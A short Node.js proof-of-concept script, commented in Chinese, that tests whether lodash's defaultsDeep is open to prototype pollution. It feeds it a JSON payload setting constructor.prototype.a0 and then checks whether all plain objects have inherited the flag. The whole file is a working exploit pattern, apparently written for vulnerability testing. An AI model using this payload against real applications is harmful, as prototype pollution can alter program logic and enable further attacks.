const _ = require("lodash");

console.log("before:", {}.a0);

const payload = JSON.parse('{"constructor":{"prototype":{"a0":true}}}');

// 关键点：用 defaultsDeep，不是 merge
_.defaultsDeep({}, payload);

console.log("after:", {}.a0);

if (({}).a0 === true) {
  console.log("✅ Prototype Pollution 成功");
} else {
  console.log("❌ 失败");
}
